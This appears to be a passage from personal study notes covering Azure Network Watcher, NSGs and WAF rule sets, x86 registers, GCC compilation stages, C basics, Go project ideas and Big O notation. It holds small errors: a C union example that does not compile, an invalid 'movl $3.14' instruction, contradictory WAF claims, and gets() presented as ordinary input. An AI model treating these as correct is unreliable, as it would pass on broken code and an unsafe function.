<h2 id="tools"><a class="header" href="#tools">Tools</a></h2>
<h3 id="network-monitoring-tools"><a class="header" href="#network-monitoring-tools">Network Monitoring Tools</a></h3>
<ul>
<li><a href="#topology">Topology</a></li>
<li><a href="#connection-monitor">Connection Monitor</a></li>
</ul>
<h2 id="topology"><a class="header" href="#topology">Topology</a></h2>
<ul>
<li>The Topology tool provides a visual representation of the network resources in a subscription. The tool shows the resources in a subscription and the connections between them. The Topology tool can be used to understand the network architecture of a subscription, identify network security groups, and troubleshoot network connectivity issues.</li>
<li>The only requirements is to have a Network Watcher resource enabled in the same region as the vNet for which you want to create a topology map.</li>
<li>There is no additional cost for using the Topology Map.</li>
</ul>
<h2 id="connection-monitor"><a class="header" href="#connection-monitor">Connection Monitor</a></h2>
<ul>
<li>Continuously monitor the connection between two endpoints.</li>
<li>Connection Monitor relies on agents that are installed on source endpoints to perform connectivity tests and collect data related to connection health. The agent simulates network traffic between source and destination to measure key metrics, such as latency.</li>
<li>The agent to install on the source endpoint depends on whether the source VM is running in Azure or on-premises. For Azure VMs, we can install the Network Watcher extension. For on-prem VMs, we can install the Azure Monitor Agent (AMA).</li>
<li>Stores results in Log Analytics</li>
<li>Connectivity checks can use HTTP, TCP, or ICMP</li>
</ul>
<h3 id="network-diagnostics-tools"><a class="header" href="#network-diagnostics-tools">Network Diagnostics Tools</a></h3>
<h2 id="ip-flow-verify"><a class="header" href="#ip-flow-verify">IP Flow Verify</a></h2>
<ul>
<li>Network Watcher IP flow verify checks if a packet is allowed or denied from a virtual machine based on 5-tuple information. The security group decision and the name of the rule that denied the packet will be returned</li>
</ul>
<h2 id="next-hop"><a class="header" href="#next-hop">Next Hop</a></h2>
<ul>
<li>Next Hop provides the next hop from the target virtual machine to the destination IP address.
<img src="clouds/azure/az700/images/network-watcher-next-hop.png" alt=""></li>
</ul>
<h2 id="connection-troubleshoot"><a class="header" href="#connection-troubleshoot">Connection Troubleshoot</a></h2>
<ul>
<li>Available from the <code>Network Watcher</code> blade or from the Virtual <code>Machine</code> blade</li>
<li>Similar to Connection Monitor, but allows you to monitor the connection between a VM and a destination IP address on-demand, rather than continuously</li>
<li>Can be used to check if a port is open at a destination</li>
<li>Only supports ICMP and TCP</li>
<li>If the endpoint to test is an Azure VM or VMSS instance, you need to install the Network Watcher extension.</li>
</ul>
<h3 id="componenents"><a class="header" href="#componenents">Componenents</a></h3>
<ul>
<li>Source Types:
<ul>
<li>VM / VMSS</li>
<li>App Gateway</li>
<li>Bastion Host</li>
</ul>
</li>
<li>Destionation Types:
<ul>
<li>Virtual Machine</li>
<li>IP Address</li>
</ul>
</li>
<li>You can choose to use IPv4 or IPv6, or both</li>
<li>You then specify the source and destination ports</li>
<li>You can also specify the protocol to use (TCP or ICMP</li>
<li>Finally, you choose the type of Diagnostic Test to run:
<ul>
<li>Connectivity Test</li>
<li>Next Hop</li>
<li>NSG Diagnostic</li>
<li>Port Scanner</li>
</ul>
</li>
</ul>
<h2 id="nsg-diagnostics"><a class="header" href="#nsg-diagnostics">NSG Diagnostics</a></h2>
<ul>
<li>The Network Security Group Diagnostics tool provides detailed information to understand and debug the security configuration of your network. For a given source-destination pair, network security group diagnostics returns all network security groups that will be traversed, the rules that will be applied in each network security group, and the final allow/deny status for the flow.</li>
<li>The tool can be used to troubleshoot connectivity issues, understand the rules that are applied to a flow, and verify that the rules are correct.</li>
</ul>
<h2 id="nsg-flow-logs"><a class="header" href="#nsg-flow-logs">NSG Flow Logs</a></h2>
<ul>
<li>NSG Flow Logs are a feature of Network Watcher that allows you to view information about ingress and egress IP traffic through a Network Security Group. The logs are stored in a storage account and can be viewed in the Azure portal or downloaded for further analysis.</li>
</ul>
<h2 id="packet-capture"><a class="header" href="#packet-capture">Packet Capture</a></h2>
<ul>
<li>Packet capture allows you to create packet capture sessions to track traffic to and from a virtual machine. You can create a packet capture session on a VM, VMSS, or network interface. The packet capture session will capture all network traffic to and from the virtual machine or network interface. You can then download the packet capture file and analyze it using a network protocol analyzer.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="network-security-groups"><a class="header" href="#network-security-groups">Network Security Groups</a></h1>
<h2 id="introduction-27"><a class="header" href="#introduction-27">Introduction</a></h2>
<ul>
<li>Network Security Groups are access control lists that are attached to a virtual machine‚Äôs vNic or a subnet</li>
<li>By default, there are no inbound allow rules added to a NSG</li>
<li>NSG rules are stateful, meaning that if you allow traffic in one direction, the return traffic is automatically allowed</li>
<li>When you have rules applied to both subnet and vNic, the rules are combined. Any allow rules at the subnet level must also be allowed at the vNic level</li>
</ul>
<h2 id="default-rules"><a class="header" href="#default-rules">Default Rules</a></h2>
<ul>
<li>
<p>There are 3 default inbound rules that are added to a NSG:</p>
<ul>
<li><strong>AllowVnetInBound</strong> - allow traffic within the vNet</li>
<li><strong>AllowAzureLoadBalancerInBound</strong> - allow traffic from Azure Load Balancer</li>
<li><strong>DenyAllInBound</strong> - deny all inbound traffic</li>
</ul>
</li>
<li>
<p>There are 3 default outbound rules that are added to a NSG:</p>
<ul>
<li><strong>AllowVnetOutBound</strong> - allow traffic within the vNet</li>
<li><strong>AllowInternetOutBound</strong> - allow traffic to the internet</li>
<li><strong>DenyAllOutBound</strong> - deny all outbound traffic</li>
</ul>
</li>
</ul>
<h2 id="rule-priority"><a class="header" href="#rule-priority">Rule Priority</a></h2>
<ul>
<li>Rules are evaluated in priority order</li>
<li>The lower the number, the higher the priority</li>
<li>The default rules have a priority of 65,000</li>
</ul>
<h2 id="rule-types"><a class="header" href="#rule-types">Rule Types</a></h2>
<ul>
<li>There are 2 types of rules:
<ul>
<li><strong>Default Rules</strong> - cannot be deleted</li>
<li><strong>Custom Rules</strong> - can be added, modified, or deleted</li>
</ul>
</li>
</ul>
<h2 id="rule-properties"><a class="header" href="#rule-properties">Rule Properties</a></h2>
<ul>
<li><strong>Name</strong> - name of the rule</li>
<li><strong>Priority</strong> - determines the order in which rules are applied</li>
<li><strong>Source/Destination</strong> - can be an IP address, CIDR block, service tag, or application security group</li>
<li><strong>Protocol</strong> - TCP, UDP, or Any</li>
<li><strong>Port Range</strong> - single port, range of ports, or * for all ports</li>
<li><strong>Action</strong> - Allow or Deny</li>
<li><strong>Direction</strong> - Inbound or Outbound</li>
</ul>
<h2 id="source-types"><a class="header" href="#source-types">Source Types</a></h2>
<ul>
<li><strong>IP Address</strong> - single IP address</li>
<li><strong>CIDR Block</strong> - range of IP addresses</li>
<li><strong>Service Tag</strong> - predefined tag for Azure services</li>
<li><strong>Application Security Group</strong> - group of VMs that can be used as a source or destination</li>
</ul>
<h2 id="service-tags"><a class="header" href="#service-tags">Service Tags</a></h2>
<ul>
<li><strong>Internet</strong> - all IP addresses</li>
<li><strong>VirtualNetwork</strong> - all IP addresses in the vNet</li>
<li><strong>AzureLoadBalancer</strong> - all IP addresses of Azure Load Balancer</li>
<li><strong>AzureTrafficManager</strong> - all IP addresses of Azure Traffic Manager</li>
<li><strong>GatewayManager</strong> - all IP addresses of VPN Gateway</li>
<li><strong>AzureMonitor</strong> - all IP addresses of Azure Monitor</li>
<li><strong>Storage</strong> - all IP addresses of Azure Storage</li>
<li><strong>SQL</strong> - all IP addresses of Azure SQL</li>
<li><strong>AppService</strong> - all IP addresses of Azure App Service</li>
<li><strong>ContainerRegistry</strong> - all IP addresses of Azure Container Registry</li>
<li><strong>KeyVault</strong> - all IP addresses of Azure Key Vault</li>
<li><strong>AzureBackup</strong> - all IP addresses of Azure Backup</li>
<li><strong>AzureDNS</strong> - all IP addresses of Azure DNS</li>
<li><strong>LogAnalytics</strong> - all IP addresses of Azure Log Analytics</li>
<li><strong>EventHub</strong> - all IP addresses of Azure Event Hub</li>
<li><strong>ServiceBus</strong> - all IP addresses of Azure Service Bus</li>
<li><strong>AzureCosmosDB</strong> - all IP addresses of Azure Cosmos DB</li>
<li><strong>AzureContainerInstance</strong> - all IP addresses of Azure Container Instance</li>
<li>etc‚Ä¶.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="web-application-firewall"><a class="header" href="#web-application-firewall">Web Application Firewall</a></h1>
<h2 id="introduction-28"><a class="header" href="#introduction-28">Introduction</a></h2>
<ul>
<li>Azure has a web application firewall integrated with two services: Azure Front Door and Azure Application Gateway.</li>
<li>A WAF is a security feature that protects web applications from common web vulnerabilities.</li>
</ul>
<h2 id="rule-sets-1"><a class="header" href="#rule-sets-1">Rule Sets</a></h2>
<ul>
<li><strong>OWASP Core Rule Set (CRS)</strong>:
<ul>
<li>Can only be applied to Application Gateway WAF and not Front Door WAF</li>
</ul>
</li>
<li><strong>Microsoft Rule Set</strong>:
<ul>
<li>Can be applied to both Application Gateway WAF and Front Door WAF</li>
<li>Contains rules authored by the Microsoft Threat Intelligence Team, in addition to the OWASP CRS rules</li>
<li>Can only be applied to the Azure Front Door Premium SKU</li>
</ul>
</li>
<li><strong>Microsoft Bot Manager Rule Set</strong>:
<ul>
<li>Can be applied to both Application Gateway WAF and Front Door Premium (not Standard) WAF</li>
<li>Contains rules to protect against bot traffic, authored by the Microsoft Threat Intelligence Team</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="assembly"><a class="header" href="#assembly">Assembly</a></h1>
<h2 id="table-of-contents-5"><a class="header" href="#table-of-contents-5">Table of Contents</a></h2>
<ul>
<li><a href="#syntaxes">Syntaxes</a>
<ul>
<li><a href="#intel">Intel</a></li>
<li><a href="#att">AT&amp;T</a></li>
</ul>
</li>
<li><a href="#registers">Registers</a>
<ul>
<li><a href="#general-purpose-registers">general-purpose Registers</a></li>
</ul>
</li>
</ul>
<h1 id="syntaxes"><a class="header" href="#syntaxes">Syntaxes</a></h1>
<ul>
<li>There are 2 types of assembly language syntax in common use:</li>
</ul>
<h2 id="intel"><a class="header" href="#intel">Intel</a></h2>
<h2 id="att"><a class="header" href="#att">ATT</a></h2>
<h1 id="registers"><a class="header" href="#registers">Registers</a></h1>
<ul>
<li>Registers are small, fast storage areas on the CPU</li>
<li>In IA-32 architecture, there are 10 32-bit registers and 6 16-bit registers</li>
<li>Registers are grouped into 3 categories: general-purpose, control, and segment
<ul>
<li>general-purpose is further grouped into data, index, and pointer</li>
</ul>
</li>
</ul>
<h2 id="general-purpose-registers"><a class="header" href="#general-purpose-registers">General-Purpose Registers</a></h2>
<h3 id="data-registers"><a class="header" href="#data-registers">Data Registers</a></h3>
<pre><code>  %eax: Accumulator, often used for arithmetic and return values.
  %ebx: Base register, used for extra storage.
  %ecx: Counter, often used in loops.
  %edx: Data register, often used for I/O operations.
</code></pre>
<h3 id="index-registers"><a class="header" href="#index-registers">Index registers</a></h3>
<pre><code>  %esi/%edi: Source and destination for data operations.
</code></pre>
<h3 id="pointer-registers"><a class="header" href="#pointer-registers">Pointer Registers</a></h3>
<pre><code>    %eip: stores the offset address of the next instruction to be executed. 
    %esp: Stack Pointer, points to the top of the stack.
    %ebp: Base Pointer, used for stack frame management.
</code></pre>
<h2 id="control-registers"><a class="header" href="#control-registers">Control Registers</a></h2>
<h2 id="segment-registers"><a class="header" href="#segment-registers">Segment Registers</a></h2>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="the-4-steps-of-compilation-with-gcc"><a class="header" href="#the-4-steps-of-compilation-with-gcc">The 4 Steps of Compilation with GCC</a></h1>
<p>GCC transforms source code into an executable file through four primary steps:</p>
<hr>
<h2 id="1-preprocessing"><a class="header" href="#1-preprocessing"><strong>1. Preprocessing</strong></a></h2>
<ul>
<li><strong>What happens</strong>:
<ul>
<li>The preprocessor handles directives in the source code (e.g., <code>#include</code>, <code>#define</code>, <code>#ifdef</code>).</li>
<li>It replaces macros, includes header files, and resolves conditional compilation directives.</li>
</ul>
</li>
<li><strong>Input</strong>: <code>.c</code> source file.</li>
<li><strong>Output</strong>: A preprocessed source file (usually with a <code>.i</code> or <code>.ii</code> extension).</li>
<li><strong>Command</strong>:
<pre><code class="language-bash">gcc -E file.c -o file.i
</code></pre>
</li>
<li><strong>Example</strong>:
<ul>
<li>Converts:
<pre><code class="language-c">#include &lt;stdio.h&gt;
#define PI 3.14
printf("PI is %f\n", PI);
</code></pre>
Into:
<pre><code class="language-c">// Expanded header contents of stdio.h
printf("PI is %f\n", 3.14);
</code></pre>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="2-compilation"><a class="header" href="#2-compilation"><strong>2. Compilation</strong></a></h2>
<ul>
<li><strong>What happens</strong>:
<ul>
<li>The compiler translates the preprocessed source code into assembly language, specific to the target architecture.</li>
</ul>
</li>
<li><strong>Input</strong>: Preprocessed source file (<code>.i</code> or <code>.ii</code>).</li>
<li><strong>Output</strong>: Assembly file (usually with a <code>.s</code> extension).</li>
<li><strong>Command</strong>:
<pre><code class="language-bash">gcc -S file.i -o file.s
</code></pre>
</li>
<li><strong>Example</strong>:
<ul>
<li>Converts preprocessed code into assembly instructions like:
<pre><code class="language-asm">movl $3.14, -4(%ebp)
call printf
</code></pre>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="3-assembly"><a class="header" href="#3-assembly"><strong>3. Assembly</strong></a></h2>
<ul>
<li><strong>What happens</strong>:
<ul>
<li>The assembler translates the assembly code into machine code, creating an object file.</li>
</ul>
</li>
<li><strong>Input</strong>: Assembly file (<code>.s</code>).</li>
<li><strong>Output</strong>: Object file (<code>.o</code> or <code>.obj</code>).</li>
<li><strong>Command</strong>:
<pre><code class="language-bash">gcc -c file.s -o file.o
</code></pre>
</li>
<li><strong>Example</strong>:
<ul>
<li>Produces a binary object file containing machine instructions that the CPU can execute.</li>
</ul>
</li>
</ul>
<hr>
<h2 id="4-linking"><a class="header" href="#4-linking"><strong>4. Linking</strong></a></h2>
<ul>
<li><strong>What happens</strong>:
<ul>
<li>The linker combines object files and libraries to create an executable program.</li>
<li>Resolves symbols (e.g., function calls, global variables) across different object files.</li>
</ul>
</li>
<li><strong>Input</strong>: One or more object files (<code>.o</code>) and optional libraries.</li>
<li><strong>Output</strong>: Executable file (e.g., <code>a.out</code> by default).</li>
<li><strong>Command</strong>:
<pre><code class="language-bash">gcc file.o -o file
</code></pre>
</li>
<li><strong>Example</strong>:
<ul>
<li>Combines multiple <code>.o</code> files and links to the standard C library (<code>libc</code>) to produce a runnable executable.</li>
</ul>
</li>
</ul>
<hr>
<h2 id="full-process-with-gcc"><a class="header" href="#full-process-with-gcc"><strong>Full Process with GCC</strong></a></h2>
<p>Running GCC without intermediate steps performs all four stages automatically:</p>
<pre><code class="language-bash">gcc file.c -o file
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="c-programming-notes"><a class="header" href="#c-programming-notes">C Programming Notes</a></h1>
<h2 id="overview-8"><a class="header" href="#overview-8">Overview</a></h2>
<ul>
<li>C is a general-purpose, procedural computer programming language supporting structured programming, lexical variable scope, and recursion, with a static type system.</li>
<li>Every C program has a <code>main()</code> function that is the entry point of the program.</li>
<li>C is a compiled language, meaning that the source code is compiled into machine code before it is executed.</li>
<li>C is a low-level language, meaning that it is closer to machine code than high-level languages like Python or JavaScript.</li>
<li>C does not support object-oriented programming</li>
<li>C is a statically typed language, meaning that the type of a variable must be declared before it is used.</li>
</ul>
<h2 id="comments"><a class="header" href="#comments">Comments</a></h2>
<ul>
<li>Single line comments are denoted by <code>//</code></li>
<li>Multi-line comments are denoted by <code>/* */</code></li>
</ul>
<h2 id="importing-libraries"><a class="header" href="#importing-libraries">Importing Libraries</a></h2>
<ul>
<li>Libraries are imported using the <code>#include</code> directive</li>
</ul>
<h2 id="variables-1"><a class="header" href="#variables-1">Variables</a></h2>
<ul>
<li>A variable scope is the region of code where a variable can be accessed.</li>
<li>In C, all variables must be declared before they are used.</li>
<li>Variables must be declared with a type and an optional initial value.</li>
<li>To declare a variable:</li>
</ul>
<pre><code>int x = 5;
unsigned int y = 10;

char c = 'a';

float f = 3.14;

double d = 3.14159;

int x[5] = {1, 2, 3, 4, 5};

struct Point {
    int x;
    int y;
};
</code></pre>
<h2 id="structs"><a class="header" href="#structs">Structs</a></h2>
<ul>
<li>A struct is a user-defined data type that groups related data together.</li>
<li>To declare a struct:</li>
</ul>
<pre><code>struct Point {
    int x;
    int y;
};
</code></pre>
<ul>
<li>To create an instance of a struct:</li>
</ul>
<pre><code>struct Point p;
p.x = 10;
p.y = 20;
</code></pre>
<ul>
<li>To create a pointer to a struct:</li>
</ul>
<pre><code>struct Point *ptr = &amp;p;
</code></pre>
<ul>
<li>To access a member of a struct using a pointer:</li>
</ul>
<pre><code>ptr-&gt;x = 30;
ptr-&gt;y = 40;
</code></pre>
<h2 id="strings"><a class="header" href="#strings">Strings</a></h2>
<ul>
<li>C does not support strings as a primitive type. Instead, strings are represented as arrays of characters. You can import the <code>string.h</code> library to use string functions.</li>
<li>To declare a string:</li>
</ul>
<pre><code>char str[10] = "Hello\0";
</code></pre>
<ul>
<li>In the example above, we declare a character array <code>str</code> with a size of 10. The string ‚ÄúHello‚Äù is stored in the array, and the null character <code>\0</code> is used to terminate the string. We use the null character because we cannot assume that the string is the same size as the array. Arrays may be larger than the string they contain.</li>
<li>C provides a string library with common functions for manipulating strings</li>
</ul>
<h2 id="data-types"><a class="header" href="#data-types">Data Types</a></h2>
<ul>
<li>Basic data types in C include:
<ul>
<li>int: integer</li>
<li>char: character</li>
<li>float: floating-point number</li>
<li>double: double-precision floating-point number</li>
<li>void: no value</li>
</ul>
</li>
<li>Modifiers can be used to modify the basic data types:
<ul>
<li>short: short integer</li>
<li>long: long integer</li>
<li>signed: signed integer</li>
<li>unsigned: unsigned integer</li>
</ul>
</li>
<li>The <code>sizeof()</code> function can be used to determine the size of a data type in bytes.</li>
<li>The <code>typedef</code> keyword can be used to create custom data types.</li>
<li>C does not include boolean types by default. Instead, 0 is considered false and any other value is considered true.</li>
</ul>
<h2 id="operators"><a class="header" href="#operators">Operators</a></h2>
<ul>
<li>Arithmetic operators: <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></li>
<li>Relational operators: <code>==</code>, <code>!=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code></li>
<li>Logical Operators: <code>&amp;&amp;</code>, <code>||</code>, <code>!</code></li>
<li>Bitwise Operators: <code>&amp;</code>, <code>|</code>, <code>^</code>, <code>~</code>, <code>&lt;&lt;</code>, <code>&gt;&gt;</code></li>
</ul>
<h2 id="line-and-spacing-conventions"><a class="header" href="#line-and-spacing-conventions">Line and Spacing Conventions</a></h2>
<ul>
<li>C is not whitespace sensitive, but it is good practice to use whitespace to make code more readable.</li>
<li>Statements in C are terminated by a semicolon <code>;</code></li>
<li>Blocks of code are enclosed in curly braces <code>{}</code></li>
</ul>
<h2 id="input-and-output"><a class="header" href="#input-and-output">Input and Output</a></h2>
<ul>
<li>The <code>printf()</code> function is used to print output to the console.</li>
<li>The <code>scanf()</code> function is used to read input from the console.</li>
<li>The <code>getchar()</code> function is used to read a single character from the console.</li>
<li>The <code>putchar()</code> function is used to print a single character to the console.</li>
<li>The <code>gets()</code> function is used to read a string from the console.</li>
<li>The <code>puts()</code> function is used to print a string to the console.</li>
</ul>
<h2 id="conditionals-1"><a class="header" href="#conditionals-1">Conditionals</a></h2>
<ul>
<li>The <code>if</code> statement is used to execute a block of code if a condition is true.</li>
<li>The <code>else</code> statement is used to execute a block of code if the condition is false.</li>
<li>The <code>else if</code> statement is used to execute a block of code if the previous condition is false and the current condition is true.</li>
<li>Example:</li>
</ul>
<pre><code>int x = 10;
if (x &gt; 5) {
    printf("x is greater than 5\n");
} else if (x == 5) {
    printf("x is equal to 5\n");
} else {
    printf("x is less than 5\n");
}
</code></pre>
<h2 id="loops"><a class="header" href="#loops">Loops</a></h2>
<ul>
<li>The <code>for</code> loop is used to execute a block of code a fixed number of times.</li>
<li>The <code>while</code> loop is used to execute a block of code as long as a condition is true.</li>
<li>The <code>do while</code> loop is similar to the <code>while</code> loop, but the condition is checked after the block of code is executed.</li>
</ul>
<h2 id="examples-1"><a class="header" href="#examples-1">Examples</a></h2>
<h3 id="hello-world-using-a-function-from-the-math-library"><a class="header" href="#hello-world-using-a-function-from-the-math-library">Hello World using a function from the math library</a></h3>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;math.h&gt;

int main() {
    printf("Hello, World!\n");
    printf("The square root of 16 is %f\n", sqrt(16));
    return 0;
}
</code></pre>
<ul>
<li>The main function returns a value of type int. By convention, a return value of 0 indicates that the program executed successfully.</li>
</ul>
<h3 id="reading-and-printing-an-integer"><a class="header" href="#reading-and-printing-an-integer">Reading and printing an integer</a></h3>
<pre><code>#include &lt;stdio.h&gt;

int main() {
    int x;
    printf("Enter an integer: ");
    scanf("%d", &amp;x);
    printf("You entered: %d\n", x);
    return 0;
}
</code></pre>
<h2 id="unions"><a class="header" href="#unions">Unions</a></h2>
<ul>
<li>A union is a user-defined data type that allows storing different data types in the same memory location.</li>
<li>The size of a union is determined by the size of its largest member.</li>
<li>A union can only store one member at a time.</li>
<li>To declare a union:</li>
</ul>
<pre><code class="language-c">union Data {
    int i;
    float f;
    char str[20];
};

int main() {}
    union Data data;
    data.i = 10;
    printf("data.i: %d\n", data.i);
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="the-bufio-package"><a class="header" href="#the-bufio-package">the bufio package</a></h1>
<h2 id="scanner"><a class="header" href="#scanner">scanner</a></h2>
<p>A scanner is a convenient way of reading data delimited by new lines or spaces.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="go-projects"><a href="#go-projects" class="header">Go-projects</a></h1>
<ul>
<li>
<p><input disabled="" type="checkbox" checked=""> csv2json</p>
</li>
<li>
<p><input disabled="" type="checkbox" checked=""> wc (word count)</p>
</li>
<li>
<p><input disabled="" type="checkbox" checked=""> cat</p>
</li>
<li>
<p><input disabled="" type="checkbox" checked=""> pwd</p>
</li>
<li>
<p><input disabled="" type="checkbox" checked=""> hashy</p>
</li>
<li>
<p><input disabled="" type="checkbox" checked=""> httping</p>
</li>
<li>
<p><input disabled="" type="checkbox" checked=""> mdp</p>
</li>
<li>
<p><input disabled="" type="checkbox" checked=""> httpbench</p>
</li>
<li>
<p><input disabled="" type="checkbox"> http status codes</p>
</li>
<li>
<p><input disabled="" type="checkbox"> get-headers</p>
</li>
<li>
<p><input disabled="" type="checkbox"> noted</p>
</li>
<li>
<p><input disabled="" type="checkbox"> todo</p>
</li>
<li>
<p><input disabled="" type="checkbox"> dnsEnum</p>
</li>
<li>
<p><input disabled="" type="checkbox"> todo</p>
</li>
<li>
<p><input disabled="" type="checkbox"> password generator</p>
</li>
<li>
<p><input disabled="" type="checkbox"> csvpeek</p>
</li>
<li>
<p><input disabled="" type="checkbox"> theHarvester clone</p>
</li>
<li>
<p><input disabled="" type="checkbox"> apache log parser into json</p>
</li>
<li>
<p><input disabled="" type="checkbox"> nginx log parser into json</p>
</li>
<li>
<p><input disabled="" type="checkbox"> fstab formatter</p>
</li>
<li>
<p><input disabled="" type="checkbox"> generic upload service</p>
</li>
<li>
<p><input disabled="" type="checkbox"> dead-link checker</p>
</li>
<li>
<p><input disabled="" type="checkbox"> my own note syncing app - Sync notes to a github repo - display notes using tea</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="immutability-1"><a href="#immutability-1" class="header">Immutability</a></h1>
<p>Functional programming is more about declaring what you want to happen, rather than how you want it to happen.</p>
<p>Example:</p>
<pre><code class="language-python">return clean_windows(add_gas(create_car()))
</code></pre>
<p><em><strong>Python is not great for functional programming, but the example above illustrates the concept.</strong></em>
Reasons python is not great for functional programming:</p>
<ol>
<li>Lack of immutability: Functional programming relies heavily on immutable data structures, whereas Python</li>
<li>Limited support for tail call optimization: Functional programming often uses recursion as a primary control structure, but Python does not optimize for tail calls, which can lead to stack overflow errors for deep recursions.</li>
<li>Mixed paradigms: Python is a multi-paradigm language that supports both imperative and object-oriented programming, which can lead to less emphasis on functional programming principles.</li>
</ol>
<p>The key distinction in the example (relative to imperative programming), is that we never change the value of the car variable. Instead, we compose functions that return new values based on the input value.</p>
<h2 id="immutability"><a class="header" href="#immutability">Immutability</a></h2>
<p>In functional programming, we strive to make data immutable. Once a data structure is created, it cannot be mutated. Instead, any modification needed creates a new data structure.</p>
<p>Immutable data is easier to think about and work with. When 10 different functions are mutating the same data structure, it can be hard to track what the current state is. With immutability, you always know that the data structure you have is exactly what it was when it was created.</p>
<p>Generally speaking, immutability means fewer bugs and more maintainable code.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="imperative-programming"><a href="#imperative-programming" class="header">Imperative-programming</a></h1>
<p>Imperative programming is a programming paradigm where we declare what we want to happen, and how we want it to happen, step by step.</p>
<p>Exmaple:</p>
<pre><code class="language-python">car = new_car()
car.add_gas(10)
car.clean_windows()
</code></pre>
<p>In the example above, we create a new car object and then modify its state by adding gas and cleaning the windows through a series of commands. Each step changes the state of the car object directly.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="computer-science"><a class="header" href="#computer-science">Computer Science</a></h1>
<h2 id="directory-map-10"><a class="header" href="#directory-map-10">Directory Map</a></h2>
<ul>
<li><a href="#measuring-algorithm-performance">algorithms</a></li>
<li><a href="#computer-architecture">computer_architecture</a></li>
<li><a href="compsci/computer_architecture/transistors.html">transistors</a></li>
<li><a href="#data-structures">data_structures</a></li>
<li><a href="#euclids-algorithm">euclids_algorithm</a></li>
<li><a href="#fizzbuzz">fizzbuzz</a></li>
<li><a href="#graph-theory">graph-theory</a></li>
<li><a href="#string-algorithms">string_algorithms</a></li>
<li><a href="#hashing">hashing</a></li>
<li><a href="compsci/key-value-stores.html">key-value-stores</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="measuring-algorithm-performance"><a class="header" href="#measuring-algorithm-performance">Measuring algorithm performance</a></h1>
<p><img src="images/big-o.png" alt=""></p>
<h2 id="analyzing-algorithms"><a class="header" href="#analyzing-algorithms">Analyzing Algorithms</a></h2>
<ul>
<li>One way to judge an algorithm‚Äôs performance is by its runtime (wall-clock time). Another method is CPU time (the time the algorithm actually run on the CPU). Neither of these are good practice, as both will vary with each run of the algorithm. Instead, computer scientists compare algorithms by looking at the number of steps they require.</li>
<li>You can input the number of steps involved in a n algorithm into a formula that can compare two or more algorithms without considering the programming language or computer.</li>
<li>Let‚Äôs take a look at a simple example:</li>
</ul>
<pre><code>package main

import (
    "fmt"
)

func main() {
    arr := []int{1,2,3,4,5}
    for _, v := range arr {
        fmt.Println(v)
    }
}
</code></pre>
<p>The function above takes 5 steps to complete. You can express this with the following formula:</p>
<pre><code>f(n) = 5
</code></pre>
<p>If you make the program more complicated, the formula will change. Let‚Äôs say you wanted to keep track of the variables as you printed them:</p>
<pre><code>package main

import (
    "fmt"
)

func main() {
    var count int = 0
    arr := []int{1,2,3,4,5}
    for _, v := range arr {
        fmt.Println(v)
        count += v
    }
}
</code></pre>
<p>The formula for this program would now be:</p>
<pre><code>f(n) = 11
</code></pre>
<p>The program takes 11 steps to complete. It first assigns the count variable the value 0. Then, it prints five numbers and increments five times (1 + 5 + 5 = 11)</p>
<p>It can be hard to determine how many steps a particular algorithm takes, especially in large programs and in functions/methods with many conditional statements. Luckily, you don‚Äôt need to care about how many steps an algorithm has. Instead, you should care about how the algorithm performs as <code>n</code> gets bigger.</p>
<p>Because the important part of an algorithm is the part that grows the fastest as <code>n</code> gets bigger, computer scientists use ‚ÄòBig O‚Äô notation to express an algorithm‚Äôs efficiency instead of a T(n) equation. Big O notation is a mathematical notation that describes how an algorithm‚Äôs time or space requirements increase as the size of n increases. Computer scientists use Big O Notation to create an order-of-magnitude function from T(n). An order-of-magnitude is a class in a classification system where each class is many times greater or smaller than the one before. In an order-of-magnitude function, you use the part of <code>T(n)</code> that dominates the equation, and ignore everything else. The part of <code>T(n)</code> that dominates the equation is an algorithm‚Äôs order of magnitude.</p>
<p>These are the most commonly used classifications for order of magnitude in Big O Notation, sorted from best (most efficient) to worst (least efficient):</p>
<ol>
<li>Constant Time</li>
<li>Logarithmic time</li>
<li>Linear time</li>
<li>Log-Linear time</li>
<li>Quadratic time</li>
<li>Cubic time</li>
<li>Exponential time</li>
</ol>
<p>Each order of magnitude describes an algorithm‚Äôs time complexity. Time complexity is the maximum number of steps an algorithm takes to complete as <code>n</code> get bigger.</p>
<h2 id="order-of-magnitude-classifications"><a class="header" href="#order-of-magnitude-classifications">Order of magnitude classifications:</a></h2>
<h3 id="constant-time"><a class="header" href="#constant-time">Constant Time</a></h3>
<ul>
<li>An algorithm runs in constant time when it requires the same number of steps regardless of the problem‚Äôs size. The Big O notation for constant time complexity is <code>O(1)</code>. For example, let‚Äôs say you own a book store. Each day, you give the first customer of that day a free book. You may track this in a program using the following code:</li>
</ul>
<pre><code>free_book = customers_for_day[0]
</code></pre>
<p>The <code>T(n)</code> equation for this would be <code>T(n) = 1</code></p>
<p>Your algorithm requires one step, no matter how many customers you have. When you graph a constant time complexity algorithm on a chart with the number of inputs on the x-axis and number of steps on the y-axis, the graph is a flat line.</p>
<h3 id="logarithmic-time"><a class="header" href="#logarithmic-time">Logarithmic Time</a></h3>
<ul>
<li>The second most efficient time complexity. An algorithm takes logarithmic time when its run time grows in proportion to the logarithm of the input size. You see this in algorithms such as a binary search that can discard many values at each iteration.</li>
<li>You express a logarithmic function in big O notation <code>O(log n)</code>.</li>
<li>A logarithm is the power that a number needs to be raised to to get some other number. In computer science, the number that we raise to (the base) is always 2 (unless otherwise specified).</li>
</ul>
<h3 id="linear-time"><a class="header" href="#linear-time">Linear Time</a></h3>
<ul>
<li>An algorithm that runs in linear time grows at the same rate as the size of the problem.</li>
<li>You express a linear algorithm in Big O notation <code>O(n)</code>.</li>
